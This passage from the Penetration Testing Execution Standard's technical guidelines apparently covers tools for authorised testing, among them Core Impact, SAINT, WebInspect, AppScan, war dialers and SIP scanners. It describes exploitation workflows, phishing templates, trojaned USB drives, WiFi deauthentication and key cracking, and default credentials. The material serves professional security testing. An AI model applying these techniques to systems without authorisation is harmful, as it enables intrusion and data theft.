be added to the network tab. See the network RPT section of the PTES for details on completing the local information gathering, privilege escalation and clean up tasks. Once the client side attack is complete, detailed reporting of the client side phishing/exploitation engagement can be generated. It is also possible to create a trojaned USB drive that will automatically install the Core agent. ''' [[:File:coreCSusb.jpg|Screenshot Here]] ''' Core Web Core can exploit SQL injection, Remote File Inclusion and Reflected Cross Site Scripting flaws on vulnerable web applications. ''' [[:File:coreWEBrpt.jpg|Screenshot Here]] ''' 1) Information Gathering. As always, the first step information gathering. Core organizes web attacks into scenarios. You can create multiple scenarios and test the same application with varying settings, segment a web application, or to separate multiple applications. a) Select the target, either by providing a url or telling Core to choose web servers discovered during the network RPT b) Choose a method for exploring the site, automatic or interactive. With automatic crawling, select the browser agent, max pages and depth, whether it should follow links to other/or to include other domains, whether it should run test to determine the server/application framework, whether to evaluate javascript, check robots.txt for links, and how it should handle forms. For greater customization, you can also select a link parsing module and set session parameters. coreWEBcrawl With interactive, you set your \u201dbrowser\u201d to use Core as a proxy and then navigate through the web application. Further customized discovery modules like checking for backup and hidden pages are available on the modules tab. ''' [[:File:corerptmodules.jpg|Screenshot Here]] ''' 2) Web Attack and penetration. The attack can be directed to a scenario or individual pages. Each type of exploit has its own configuration wizard. SQL Injection tests can be performed on request parameters and/or request cookies. There are three different levels of injection attacks FAST: quickly runs the most common tests, NORMAL: runs the tests that are in the FAST plus some additional tests FULL: runs all tests (for details on what the difference tests check for, select the modules tab, navigate to the Exploits | SQL Injection section and view the contents of the SQL Injection Analyzer paying attention to the fuzz_strings). Adding information about known custom error pages and any session arguments will enhance testing. For XSS attacks, configure the browser XSS should be tested for, whether or not to evaluate POST parameters and whether to look for Persistent XSS vulnerabilities. For PHP remote file injection vulnerabilities, the configuration is either yes try to exploit or no, don\u2019t. Monitor the module progress in the Executed Modules pane. If the WebApps Attack and Penetration is successful, then Core Agents (see note on agents in Core network RPT) will appear under vulnerable pages in the Entity View. 3) Web Apps Browser attack. Can leverage XSS exploits to assist with Social Engineering awareness tests. The wizard will guide the penetration tester though the process of leveraging the XSS vulnerability to your list of recipients from the client side information gathering phase. 4) Web App Local Information Gathering. Will check for sensitive information, get database logins and get the database schema for pages where SQL was successfully exploited. Command and SQL shells may also be possible. ''' [[:File:coreWEBagendeployed.jpg|Screenshot Here]] ''' The RFI agent(PHP) can be used to gather information, for shell access, or to install the full Core Agent. 5) Report Generation. Select from a variety of reports like executive, vulnerability and activity reports. Core Onestep Web RPTs Core also has two one-step rapid penetration tests 1) WebApps Vulnerability Test Type in the web application and Core will attempt to locate pages that contain vulnerabilities to SQL Injection, PHP Remote File Inclusion, or Cross-site Scripting attacks. This test can also be scheduled. 2) WebApps Vulnerability Scanner Validator Core will try to confirm vulnerabilities from IBM Rational AppScan, HP WebInspect, or NTOspider scans. Core WiFi Core Impact contains a number of modules for penetration testing an 802.11 wireless network and/or the security of wireless clients. In order to use the wireless modules you must use an AirPcap adapter available from www.cacetech.com . 1) Information Gathering. Select the channels to scan to discover access points or capture wireless packets. 2) Wireless Denial of Service The station deauth module can be used to demonstrate wireless network disruption. It is also used to gather information for encryption key cracking. 3) Crack Encryption Keys. Attempt to discover and crack WEP and WPA/WPA2 PSK encryption keys. For WPA/WPA2, relevant passwords files from recognisance phase should be used. 4) Man in the Middle client attacks. Allows penetration tester to sniff wireless traffic, intercept or manipulate requests to gain access to sensitive data or an end user system. Leverage existing wireless network from steps one and two, or setup fake access points with the Karma Attack. 5) Reporting. Reports about all the discovered WiFi networks , summary information about attacks while using a Fake Access Point and results of Man In The Middle (MiTM) attacks can be generated. SAINT SAINT Professional is a commercial suite combining two distinct tools rolled into one easy to use management interface; SAINTscanner and SAINTexploit providing a fully integrated vulnerability assessment and penetration testing toolkit. SAINTscanner is designed to identify vulnerabilities on network devices, OS and within applications. It can be used for compliance and audit testing based on pre-defined and custom policies. In addition as a data leakage prevention tool it can enumerate any data that should not be stored on the network. SAINTexploit is designed to exploit those vulnerabilities identified by SAINTscanner, with the ability to carry out bespoke social engineering and phishing attacks also. One a host or device has been exploited it can be utilised to tunnel through to other vulnerable hosts. SAINT can either be built from source or be run from a pre-configured virtual machine supplied by the vendor. If the latter is used (recommended) simply double clicking the icon will launch the suite. By default the password is \u201cSAINT!!!\u201d The default web browser opens after SAINT auto updates to the following URL: http:// :52996/ Screenshot Here SAINT_startup.png refers (included). SAINTscanner Once logged in you immediately enter the SAINTscanner page with the Penetration Testing (SAINTXploit) tab easily available and visible. It is possible to login remotely to SAINT, by default this is over port 1414 and has those hosts allowed to connect have to be setup via Options, startup options, Category remote mode, subcategory host options: Screenshot Here SAINT_Remote_host.png refers (included). Configuration of scanning options should now be performed which is accessed by Options, scanning options, Category scanning policy. Each sub category needs to be addressed to ensure that the correct default scanning parameters are set i.e. using nmap rather than the in-built SAINT port scanner and which ports to probe, that dangerous checks are disabled (if required) and that the required items for compliance and audit are enabled for reporting i.e. anti-virus, age of definition check etc. Screenshot Here SAINT_scanning_options.png refers (included). Note: - The target restrictions sub-category should be amended if any hosts are not to be probed. The most import scanning option is Category Scanning policy, sub-category probe options, option, what scanning policy should be used, the scan required is selected or a custom policy built-up to suit the actual task Screenshot here SAINT_policy_setup.png refers (included). Having configured all the options required the actual process of carrying out a scan can be addressed. Step 1 Insert IP Range/ Address or Upload Target List Step 2 Type in credentials Screenshot here SAINT_scansetup1.png refers (included). Step 3 Select Scan Policy Type Step 4 Determine Firewall settings for Target Step 5 Select Scan Now Screenshot here SAINT_scansetup2.png refers (included). SAINTexploit Different levels of penetration tests can be carried out: Discovery - Identify hosts. Information Gathering - Identify hosts, probe and port scan. Single Penetration - Both above then exploits stopping at first successful exploit. Root Penetration - Exploit then Privilege escalation to admin/ root. Full Penetration - Exploits as many vulnerabilities as possible. Web Application - Attacks discovered web applications. Conducting a test is fairly straight forward, once any prior configuration has been carried out, callback ports, timeouts etc. Just select the Pen Test icon then go through the following 4 steps. Once complete select run pen test now. Step 1 Insert IP Range/ Address or Upload Target List Step 2 Type in credentials Screenshot here SAINT_pen1.png refers (included). Step 3 Select Penetration Test Type Step 4 Determine Firewall settings for Target SAINT_pen2.png Screenshot here SAINT_pen2.png refers (included). Once a host has been successfully exploited, navigating to the connections tab provides the ability to directly interact with the session. SAINTexploit provides four useful tools in this tab to allow interactive access to the session and a disconnect button to close any outstanding connection: Command Prompt. File and Upload Manager. Screenshot Taker Tunnel. Screenshot here SAINT_connections.png refers (included) The File Manager gives the ability to perform numerous actions. This is opened via the connections tab, providing the ability to upload/ download/ rename files. Screenshot here SAINT_filemgr.png refers (included) A Command Prompt can be utilised on an exploited host, the tool is opened via the connections tab, all DOS/Bash type commands that are applicable to the target OS can be ran. Screenshot here SAINT_cmd.png refers (included) The Screenshot Tool can be used against an exploited host to grab a screenshot for the report. Screenshot here SAINT_screen.png refers (included) Varied other tools that can be utilised against the host, i.e. grabbing password hashes and many others can be accessed and executed via the exploits icon, tools option. Custom Client Side attacks These can be performed by using the exploits icon, selecting exploits, expanding out the client list and clicking on the appropriate exploit that you wish to utilise against the client (run now) Screenshot here SAINT_client1.png refers (included) Select, port the client is to connect to, the shell port and the target type. Annotate any specific mail from and to parameters Screenshot here SAINT_client2.png refers (included) Type in the subject, either select a predefined template and alter the message to suit Screenshot here SAINT_client3.png refers (included) A sample pre-defined template is available which looks very realistic Screenshot here SAINT_client4.png refers (included) Selecting run now will start the exploit server against the specified target host Screenshot here SAINT_client5.png refers (included) If a client click the link in the email they have just been sent, and they are exploitable, the host will appear in the connections tab and can then be interacted with as above. SAINTwriter SAINTwriter is a component of SAINT that allows you to generate a variety of customised reports. SAINTwriter features eight pre-configured reports, eight report formats (HTML, Frameless HTML, Simple HTML, PDF, XML, text, tab-separated text, and comma-separated text), and over 100 configuration options for custom reports. To generate a report Step 1 From the SAINT GUI, go to Data, and from there go to SAINTwriter. Step 2 Read the descriptions of the pre-configured reports and select the one which best suits your needs. Screenshot here SAINT_writer.png refers (included). A sample report is available here and here SAINT_report1.pdf and SAINT_report2.pdf refer (included) Web Application Scanners General Web Application Scanners WebInspect (Windows) HP's WebInspect application security assessment tool helps identify known and unknown vulnerabilities within the Web application layer. WebInspect can also help check that a Web server is configured properly, and attempts common web attacks such as parameter injection, cross-site scripting, directory traversal, and more When you first start WebInspect, the application displays the Start Page. For this page we can perform the five major functions within the WebInpsect GUI. The options are to start a Web Site Assessment, start a Web Service Assessment, start an Enterprise Assessment, generate a Report, and start Smart Update. From the Start Page, you can also access recently opened scans, view the scans that are scheduled for today and finally, view the WebInspect Messages. ''' [[:File:Penetration_Testing_Execution_99.png|Screenshot Here]] ''' The first scan that is performed with WebInspect is the Web Site Assessment Scan. WebInspect makes use of the New Web Site Assessment Wizard to setup the assessment scans. ''' [[:File:Penetration_Testing_Execution_100.png|Screenshot Here]] ''' When you start the New Scan wizard, the Scan Wizard window appears. The options displayed within the wizard windows are extracted from the WebInspect default settings. The important thing to note is that any changes you make will be used for this scan only. In the Scan Name box, enter a name or a brief description of the scan. Next you need to select one an assessment mode. The options available are Crawl Only, Crawl and Audit, Audit Only, and Manual. The \"Crawl Only\" option completely maps a site's tree structure. It is possible after a crawl has been completed, to click \"Audit\" to assess an application's vulnerabilities. \"Crawl and Audit\" maps the site's hierarchical data structure, and audits each page as it is discovered. This should be used when assessing extremely large sites. \"Audit Only\" determines vulnerabilities, but does not crawl the web site. The site is not assessed when this option is chosen. Finally, \"Manual\" mode allows you to navigate manually to sections of the application. It does not crawl the entire site, but records information only about those file_suport that you encounter while scanning a Site manually navigating the site. Use this option if there are credentialed scans being performed. Also, ensure that you embed the credentials in the profile settings. ''' [[:File:Penetration_Testing_Execution_101.png|Screenshot Here]] ''' It is recommended to crawl the client site first. This allows the opportunity to identify any forms that need to be filtered during the audit as well as identify directories/file names (in some cases, even the profiler) that need to be ignored for a scan to complete. Once you have selected the assessment mode, you will need to select the assessment type. There are four options available, Standard Assessment, List-Driven Assessment, Manual Assessment, and Workflow-Driven Assessment. The Standard Assessment type consists of automated analysis, starting from the target URL. This is the normal way to start a scan. Manual Assessment allows you to navigate manually to whatever sections of your application you choose to visit, using Internet Explorer. List-Driven Assessment performs an assessment using a list of URLs to be scanned. Each URL must be fully qualified and must include the protocol (for example, http:// or https://). Workflow-Driven Assessment: WebInspect audits only those URLs included in the macro that you previously recorded and does not follow any hyperlinks encountered during the audit. As discussed earlier, Standard Assessment will normally be used for the initial scans. If this is the choice you've selected you will need to type or select the complete URL or IP address of the client's site to be examined. When you enter a URL, it must be precise. For example, if you entering client.com will not result in a scan of www.client.com or any other variations. To scan from a specific point append a starting point for the scan, such as http://www.client.com/clientapplication/ . By default, scans performed by IP address will not follow links that use fully qualified URLs. ''' [[:File:Penetration_Testing_Execution_102.png|Screenshot Here]] ''' Select \"Restrict to folder\" to limit the scope of the assessment to the area selected. There are three options available from the drop-down list. ''' [[:File:Penetration_Testing_Execution_103.png|Screenshot Here]] ''' The choices are Directory only, Directory and subdirectories, and Directory and parent directories. Choosing the \"Directory only\" option will force a crawl and/or audit only for the URL specified. The \"Directory and subdirectories\" options will crawl and/or audit at the URL specified as well as subordinate directories. It will not access any directory than the URL specified. The \"Directory and parent directories\" option will crawl and/or audit the URL you specified, but will not access any subordinate directories. Once you have selected to appropriate options, click Next to continue. If the target site needs to accessed through a proxy server, select Network Proxy and then choose an option from the Proxy Profile list. The default is to Use Internet Explorer. The other options available are Autodetect, Use PAC File, Use Explicit Proxy Settings, and Use Mozilla Firefox. Autodetect uses the Web Proxy Autodiscovery Protocol (WPAD) to locate a proxy autoconfig file and use this to configure the browser's Web proxy settings. Use PAC File loads proxy settings from a Proxy Automatic Configuration (PAC) file. Use Explicit Proxy Settings allows you to specify proxy server settings. Use Mozilla Firefox imports the proxy server information from Firefox. ''' [[:File:Penetration_Testing_Execution_104.png|Screenshot Here]] ''' Selecting to use browser proxy settings does not guarantee that you will be able to access the Internet through a particular proxy server. If the Internet Explorer settings are configured to use a proxy that is not running, then you will not be able to access the site to begin the assessment. For this reason, it is always recommended to check the prosy settings of the application you have selected. Select Network Authentication if server authentication is required. Then choose the specific authentication method and enter your network credentials. Click Next to continue. The Coverage and Thoroughness options are not usually modified, unless you are targeting an Oracle site. [[:File:Penetration_Testing_Execution_105.png|Screenshot Here]] To optimize settings for an Oracle site, select Framework and then choose the site type from the Optimize scan for list. Use the Crawl slider to specify the crawler settings. If enabled, the slider allows you to select one of four crawl positions. The options are Thorough, Default, Normal, and Quick. The specific settings are as follows: Thorough uses the following settings: Redundant Page Detection: OFF Maximum Single URL Hits: 20 Maximum Web Form Submissions: 7 Create Script Event Sessions: ON Maximum Script Events Per Page: 2000 Number of Dynamic Forms Allowed Per Session: Unlimited Include Parameters In Hit Count: True Default uses the following settings: Redundant Page Detection: OFF Maximum Single URL Hits: 5 Maximum Web Form Submissions: 3 Create Script Event Sessions: ON Maximum Script Events Per Page: 1000 Number of Dynamic Forms Allowed Per Session: Unlimited Include Parameters In Hit Count: True Normal uses the following settings: Redundant Page Detection: OFF Maximum Single URL Hits: 5 Maximum Web Form Submissions: 2 Create Script Event Sessions: ON Maximum Script Events Per Page: 300 Number of Dynamic Forms Allowed Per Session: 1 Include Parameters In Hit Count: False Quick uses the following settings: Redundant Page Detection: ON Maximum Single URL Hits: 3 Maximum Web Form Submissions: 1 Create Script Event Sessions: OFF Maximum Script Events Per Page: 100 Number of Dynamic Forms Allowed Per Session: 0 Include Parameters In Hit Count: False Select the appropriate crawl position and click Next to continue. ''' [[:File:Penetration_Testing_Execution_106.png|Screenshot Here]] ''' Ensure that the select Run Profiler Automatically box is checked. Click Next to continue. ''' [[:File:Penetration_Testing_Execution_107.png|Screenshot Here]] ''' At this point the scan has been properly configured. There is an option to save the scan settings for later use. Click Scan to exit the wizard and begin the scan. As soon as you start a Web Site Assessment, WebInspect displays in the Navigation pane an icon depicting each session. It also reports possible vulnerabilities on the Vulnerabilities tab and Information tab in the Summary pane. If you click a URL listed in the Summary pane, the program highlights the related session in the Navigation pane and displays its associated information in the Information pane. The relative severity of a vulnerability listed in the Navigation pane is identified by its associated icon. [[:File:Penetration_Testing_Execution_108.png|Screenshot Here]] When conducting or viewing a scan, the Navigation pane is on the left side of the WebInspect'' ''window. It includes the Site, Sequence, Search, and Step Mode buttons, which determines view presented. When conducting or viewing a scan, the Information pane contains three collapsible information panels and an information display area. Select the type of information to display by clicking on an item in one of three information panels in the left column. The Summary pane has five tabs: Vulnerabilities, Information, Best Practices, Scan Log, and Server Information. The Vulnerabilities Tab lists all vulnerabilities discovered during an audit. The Information Tab lists information discovered during an assessment or crawl. These are not considered vulnerabilities, but simply identify interesting points in the site or certain applications or Web servers. The Best Practices Tab lists issues detected by WebInspect that relate to commonly accepted best practices for Web development. Items listed here are not vulnerabilities, but are indicators of overall site quality and site development security practices (or lack thereof). The Scan Log Tab is used to view information about the assessment. For instance, the time at which certain auditing was conducted against the target. Finally, the Server Information Tab lists items of interest pertaining to the server. ''' [[:File:Penetration_Testing_Execution_109.png|Screenshot Here]] ''' The final step is to export the results further analysis. To export the results of the analysis to an XML file, click File, then Export. This presents the option to export the Scan or Scan Details. ''' [[:File:Penetration_Testing_Execution_110.png|Screenshot Here]] ''' From the Export Scan Details window we need to choose the Full from the Details option. This will ensure that we obtain the most comprehensive report possible. Since this is only available in XML format, the only option we have left to choose is to scrub data. If you want to ensure that SSN, and Credit Card data is scrubbed then select these options. If you choose to scrub IP address information then the exported data will be useless for our purposes. Click Export to continue. Choose the file location to save the exported data. '''Web Service Assessment Scan''' The first scan that is performed with WebInspect is the Web Site Assessment Scan. WebInspect makes use of the New Web Site Assessment Wizard to setup the assessment scans. ''' [[:File:Penetration_Testing_Execution_111.png|Screenshot Here]] ''' When you start the New wizard, the Web Service Scan Wizard window appears. The options displayed within the wizard windows are extracted from the WebInspect default settings. The important thing to note is that any changes you make will be used for this scan only. In the Scan Name box, enter a name or a brief description of the scan. Next you need to select one an assessment mode. The options available are Crawl Only, and Crawl and Audit. The \"Crawl Only\" option completely maps a site's tree structure. It is possible after a crawl has been completed, to click \"Audit\" to assess an application's vulnerabilities. \"Crawl and Audit\" maps the site's hierarchical data structure, and audits each page as it is discovered. ''' [[:File:Penetration_Testing_Execution_112.png|Screenshot Here]] ''' Once you have selected the assessment mode, you will need to select the location of the WSDL file. WSDL is an XML format for describing network services as a set of endpoints operating on messages containing either document-oriented or procedure-oriented information. Once you have selected to appropriate options, click Next to continue. ''' [[:File:Penetration_Testing_Execution_113.png|Screenshot Here]] ''' At this point the scan has been properly configured. There is an option to save the scan settings for later use. Click Scan to exit the wizard and begin the scan. As soon as you start a Web Service Assessment, WebInspect displays in the Navigation pane an icon depicting each session. It also reports possible vulnerabilities on the Vulnerabilities tab and Information tab in the Summary pane. If you click a URL listed in the Summary pane, the program highlights the related session in the Navigation pane and displays its associated information in the Information pane. The relative severity of a vulnerability listed in the Navigation pane is identified by its associated icon. ''' [[:File:Penetration_Testing_Execution_114.png|Screenshot Here]] ''' When conducting or viewing a scan, the Navigation pane is on the left side of the WebInspect'' ''window. It includes the Site, Sequence, Search, and Step Mode buttons, which determines view presented. When conducting or viewing a scan, the Information pane contains three collapsible information panels and an information display area. Select the type of information to display by clicking on an item in one of three information panels in the left column. The Summary pane has five tabs: Vulnerabilities, Information, Best Practices, Scan Log, and Server Information. The Vulnerabilities Tab lists all vulnerabilities discovered during an audit. The Information Tab lists information discovered during an assessment or crawl. These are not considered vulnerabilities, but simply identify interesting points in the site or certain applications or Web servers. The Best Practices Tab lists issues detected by WebInspect that relate to commonly accepted best practices for Web development. Items listed here are not vulnerabilities, but are indicators of overall site quality and site development security practices (or lack thereof). The Scan Log Tab is used to view information about the assessment. For instance, the time at which certain auditing was conducted against the target. Finally, the Server Information Tab lists items of interest pertaining to the server. ''' [[:File:Penetration_Testing_Execution_115.png|Screenshot Here]] ''' The final step is to export the results for further analysis. To export the results of the analysis to an XML file, click File, then Export. This presents the option to export the Scan or Scan Details. ''' [[:File:Penetration_Testing_Execution_116.png|Screenshot Here]] ''' From the Export Scan Details window we need to choose the Full from the Details option. This will ensure that we obtain the most comprehensive report possible. Since this is only available in XML format, the only option we have left to choose is to scrub data. If you want to ensure that SSN, and Credit Card data is scrubbed then select these options. If you choose to scrub IP address information then the exported data will be useless for our purposes. Click Export to continue. Choose the file location to save the exported data. IBM AppScan IBM Rational AppScan automates application security testing by scanning applications, identifying vulnerabilities and generating reports with recommendations to ease remediation. This tutorial will apply to the AppScan Standard Edition which is a desktop solution to automate Web application security testing. It is intended to be use by small security teams with several security testers. To ensure APPScan has the latest updates you should click update on the toolbar menu. This will check the IBM servers for updates. Internet access is required. The simplest way to configure a scan is to use the Configuration Wizard. You can access the Configuration Wizard by clicking \u201cNew\u201d on the File menu. You will be presented with the \u201cNew Scan\u201d dialog box. Enable or disable the \u201cConfiguration Wizard\u201d by checking the box. You can then choose what type of scan you wish to perform. The default is a Web Application Scan. You then have to enter the starting URL for the web application. Other options on that screen include choosing Case-Sensitivity path for Unix\\Linux systems, adding additional servers and domains and enabling proxy and platform authentication option. Uncheck the case-sensitivity path option if you know all the systems are windows as it can help reduce the scan time. If the web application requires authentication then there are several options to choose from. Recorded allows you to record the login procedure so that AppScan can perform the login automatically. Prompt will prompt with the login screen during the scan when a login is required. Automatic can be used in web applications that only require a username and password. An important option is the \u201cI want to configure In-Session detection options\u201d if anything other they \u201cNone\u201d is chosen. This option automatically detects if the web application is out of session. AppScan with automatically configure this feature but if it\u2019s not correct scan results will be unreliable. Next you will be asked to choose a test policy. There are various built-in policies and each have various inclusions and exclusions. You can also create a custom policy. By default AppScan tests the login and logout pages. This is enabled with the \u201cSend tests on login and logout pages\u201d option. Some applications have safeguards that could lockout the test account and prevent a scan from completing. You need monitor the testing logs to ensure login is not failing. AppScan also deletes previous session tokens before testing login pages. You may need to disable this option if a valid session token is required on the login pages. This can disabled by unchecking the \u201cClear session identifiers before testing login pages\u201d option You have now completed the scan configuration and will be prompted to start the scan. By default AppScan will start a full scan of the application. To ensure full coverage of the application a Manual Explore of the application is preferred. With this option AppScan with provide you with a browser window and you can access the application to explore every option and feature available. Once the full application has been explored you can close the browser and AppScan will add the discovered pages its list for testing. You can then start the full scan (Using Scan\uf0e0Full Scan on the menu bar) and AppScan will automatically scan the application. Web Directory Listing/Bruteforcing DirBuster is a java application that is designed to brute force web directories and files names. DirBuster attempts to find hidden or obfuscated directories, but as with any bruteforcing tool, it is only as good as the directory and file list utilized. For that reason, DirBuster has 9 different lists. [[:File:Penetration_Testing_Execution_117.png|Screenshot Here]] Webserver Version/Vulnerability Identification The ability to identify the Webserver version is critical to identify vulnerabilities specific to a particular installation. This information should have been gathered as part of an earlier phase. NetSparker (Windows) NetSparker is windows based Web Application Scanner. This scanner tests for all common types of web application security flaws. This scanner allows the user to enter NTLM, Forms based and certificate based credentials. NetSparker boasts its ability to confirm the findings it presents to the user. NetSparker is an inexpensive Web Application Scanner. When launching NetSparker, the user is presented with the following screen, which has tabs for the Scan Settings, Authentication and Advanced Settings. NetSparker allows the user to enter credentials for Forms based Authentication in the following dialogue. Once credentials have been entered, NetSparker presents those to the web application in a mini-browser view as seen below. The below confirms that NetSparker is able to use the supplied credentials to login to the application. In an effort to make sure that NetSparker knows when it has logged itself out of the web application, the user is able to specify the logged in and logged out conditions. The final step of the process confirms the settings are configured correctly. NetSparker offers five different methods to start the scan as seen below. These include Start Scan, Crawl and Wait, Manual Crawl (Proxy Mode), Scan Imported Links Only and Schedule Scan. The scan starts with a crawl of the website and classifies the potential security issues as seen below. The next phase is attacking the website. This begins to show identified vulnerabilities as shown in this screenshot. Each finding can be shown in a Browser View as shown in this screenshot. The vulnerability can also be displayed in an HTTP Request / Response format as seen in this screenshot. To check the status of the scan, click on View and select Dashboard. Also included is the Vulnerability Chart Reporting options include PDF, HTML, CSV and XML formats. Specialized Vulnerability Scanners Virtual Private Networking (VPN) Virtual Private Networking (VPN) involves \"tunneling\" private data through the Internet. The four most widely known VPN \"standards\" are Layer 2 Forwarding (L2F), IP Security (IPSec), Point-to-Point Tunneling Protocol (PPTP), and Layer 2 Tunneling Protocol (L2TP). VPN servers generally will not be detected by a port scans as they don't listen on TCP ports, so a TCP port scan won't find them. In addition, they won't normally send ICMP unreachable messages, so a UDP port scans more than likely won't find them. This is why we need specialized scanners to find and identify them. '''ike-scan''' ike-scan is a command-line IPsec VPN scanning, fingerprinting and testing tool that uses the IKE protocol to discover, fingerprint and test IPsec VPN servers. Ike-scan sends properly formatted IKE packet to each of the address you wish to scan and displays the IKE responses that are received. While ike-scan has a dozens of options, we will only cover the basics here. [[:File:Penetration_Testing_Execution_118.png|Screenshot Here]] Using ike-scan to actually perform VPN discovery is relatively straight forward. Simply give it a range and it will attempt to identify [[:File:Penetration_Testing_Execution_119.png|Screenshot Here]] IPv6 The THC-IPV6 Attack Toolkit is a complete set of tools to scan for inherent protocol weaknesses of IPv6 deployments. Implementation6 which performs various implementation checks on IPv6. [[:File:Penetration_Testing_Execution_120.png|Screenshot Here]] Exploit6 is another tool from the THC-IPV6 Attack Toolkit which can test for known ipv6 vulnerabilities. [[:File:Penetration_Testing_Execution_121.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_122.png|Screenshot Here]] War Dialing War dialing is process of using a modem to automatically scan a list of telephone numbers, usually dialing every number in a local area code to search for computers, Bulletin board systems and fax machines. '''WarVOX''' WarVOX is a suite of tools for exploring, classifying, and auditing telephone systems. Unlike normal wardialing tools, WarVOX works with the actual audio from each call and does not use a modem directly. This model allows WarVOX to find and classify a wide range of interesting lines, including modems, faxes, voice mail boxes, PBXs, loops, dial tones, IVRs, and forwarders. WarVOX provides the unique ability to classify all telephone lines in a given range, not just those connected to modems, allowing for a comprehensive audit of a telephone system. VoIP VoIP networks rely on the network infrastructure that just simply targeting phones and servers is like leaving half the scope untouched. The intelligence gathering phase should have resulted in identify all network devices, including routers and VPN gateways, web servers, TFTP servers, DNS servers, DHCP servers, RADIUS servers, and firewalls. Note: The default username is admin with a password of warvox. [[:File:Penetration_Testing_Execution_122.png|Screenshot Here]] '''iWar''' iWar is a War dialer written for Linux, FreeBSD, OpenBSD, etc. [[:File:Penetration_Testing_Execution_123.png|Screenshot Here]] '''Plain Analog Wardialer (PAW) / Python Advanced Wardialing System (PAWS)''' PAW / PAWS is a wardialing software in python. It is designed to scan for ISDN (PAWS only) and newer analog modems. [[:File:Penetration_Testing_Execution_124.png|Screenshot Here]] '''SIPSCAN''' SIPSCAN uses REGISTER, OPTIONS and INVITE request methods to scan for live SIP extensions and users. SIPSCAN comes with a list of usernames (users.txt) to brute force. This should be modified to include data collected during earlier phases to target the specific environment. [[:File:Penetration_Testing_Execution_125.png|Screenshot Here]] '''SIPSAK''' SIPSAK is tool that can test for SIP enabled applications and devices using the OPTION request method only. [[:File:Penetration_Testing_Execution_126.png|Screenshot Here]] '''SVMAP''' SVMAP is a part of the SIPVicious suite and it can be used to scan identify and fingerprint a single IP or a range of IP addresses. Svmap allows specifying the method being used such as OPTIONS, INVITE, and REGISTER. [[:File:Penetration_Testing_Execution_127.png|Screenshot Here]] Passive Testing Passive Testing is exactly what it sounds like. Testing for vulnerabilities but doing so in a passive manner. This is often best left to automated tools, but it can be accomplished by manually methods as well. Automated Tools Traffic Monitoring Traffic Monitoring is a passive mechanism for gathering further information about the targets. This can be helpful in determining the specifics of an operating system or network device. There are times when active fingerprinting may indicate, for example, an older operating system. This may or may not be the case. Passive fingerprinting is essentially a \"free\" way to ensure that the data you are reporting is as accurate as possible. '''P0f''' P0f is an awesome passive fingerprinting tool. P0f can identify the operating system on based upon machines you connect to and that you connect to as well as machines that you cannot connect to. Also, it can fingerprint machines based upon the communications that your interfaces can observe. [[:File:Penetration_Testing_Execution_128.png|Screenshot Here]] Wireshark Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education. Originally named Ethereal, in May 2006 the project was renamed Wireshark due to trademark issues. Wireshark is cross-platform, using the GTK + widget toolkit to implement its user interface, and using pcap to capture packets; it runs on various Unix-like operating systems including Linux, Mac OS X, BSD, and Solaris, and on Microsoft Windows. [[:File:Penetration_Testing_Execution_129.png|Screenshot Here]] Tcpdump Tcpdump is a common packet analyzer that runs under the command line. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached. Tcpdump works on most Unix-like operating systems: Linux, Solaris, BSD, Mac OS X, HP-UX and AIX among others. In those systems, tcpdump uses the libpcap library to capture packets. There is also a port of tcpdump for Windows called WinDump; this uses WinPcap, which is a port of libpcap to Windows. [[:File:Penetration_Testing_Execution_130.png|Screenshot Here]] Metasploit Scanners Metasploit Unleashed The [ http://www.offensive-security.com/metasploit-unleashed/Vulnerability_Scanning Metasploit Unleashed] course has several tutorials on performing vulnerability scanning leveraging the Metasploit Framework. Vulnerability Validation Public Research A product of the vast amount of security research is the discovery of vulnerabilities and associated Proof of Concept (PoC) and/or exploit code. The results from the vulnerability identification phase must be individually validated and where exploits are available, these must be validated. The only exception would be an exploit that results in a Denial of Service (DoS). This would need to be included in the scope to be considered for validation. There are numerous sites that offer such code for download that should be used as part of the Vulnerability Analysis phase. Exploit-db - http://www.exploit-db.com Security Focus - http://www.securityfocus.com Packetstorm - http://www.packetstorm.com Security Reason - http://www.securityreason.com Black Asylum - http://www.blackasylum.com/?p#160 Common/default passwords Attempt to identify if a device, application, or operating system is vulnerable to a default credential attack is really as simple as trying to enter in known default passwords. Default passwords can be obtained from the following websites: * http://www.phenoelit-us.org/dpl/dpl.html * http://cirt.net/passwords * http://www.defaultpassword.com * http://www.passwordsdatabase.com * http://www.isdpodcast.com/resources/62k-common-passwords/ Establish target list Identifying all potential targets is critical to penetration testing. Properly established target lists ensure that attacks are properly targeted. If the particular versions of software running in the environment can be identified, the tester is dealing with a known quantity, and can even replicate the environment. A properly defined target list should include a mapping of OS version, patch level information. If known it should include web application weaknesses, lockout thresholds and weak ports for attack. Mapping Versions Version checking is a quick way to identify application information. To some extent, versions of services can be fingerprinted using nmap, and versions of web applications can often be gathered by looking at the source of an arbitrary page. Identifying Patch Levels To identify the patch level of services internally, consider using software which will interrogate the system for differences between versions. Credentials may be used for this phase of the penetration test, provided the client has acquiesced. Vulnerability scanners are particularly effective at identifying patch levels remotely, without credentials. Looking for Weak Web Applications Identifying weak web applications can be a particularly fruitful activity during a penetration test. Things to look for include OTS applications that have been misconfigured, OTS application which have plugin functionality (plugins often contain more vulnerable code than the base application), and custom applications. Web application fingerprinters such as WAFP can be used here to great effect. Identify Weak Ports and Services ##### Identifying weak ports can be done using banner grabbing, nmap and common sense. Many ports and services will lie, or mislead about the specifics of their version. Identify Lockout threshold Identifying the lockout threshold of an authentication service will allow you to ensure that your bruteforce attacks do not intentionally lock out valid users during your testing. Identify all disparate authentication services in the environment, and test a single, innocuous account for lockout. Often 5 - 10 tries of a valid account is enough to determine if the service will lock users out. Attack Avenues Attack avenues focus on identifying all potential attack vectors that could be leveraged against a target. This is much more detailed than simply looking at the open or filtered ports, but evaluates the Footprinting information and automated results in an effort to create an attack tree. Creation of Attack Trees Attack trees are conceptual diagrams of threats on target systems and should include all possible attack methods to reach those threats. Identify protection mechanisms There is no magic bullet for detecting and subverting Network or Host based protection mechanisms. It takes skill and experience. This is beyond the scope of this document, which only lists the relevant protection mechanisms and describes what they do. Network protections \"Simple\" Packet Filters Packet filters are rules for classifying packets based on their header fields. Packet classification is essential to routers supporting services such as quality of service (QoS), virtual private networks (VPNs), and firewalls. Traffic shaping devices Traffic shaping is the control of computer network traffic in order to optimize or guarantee performance, improve latency, and/or increase usable bandwidth for some kinds of packets by delaying other kinds of packets that meet certain criteria. During penetration test traffic shaping can also control the volume of traffic being 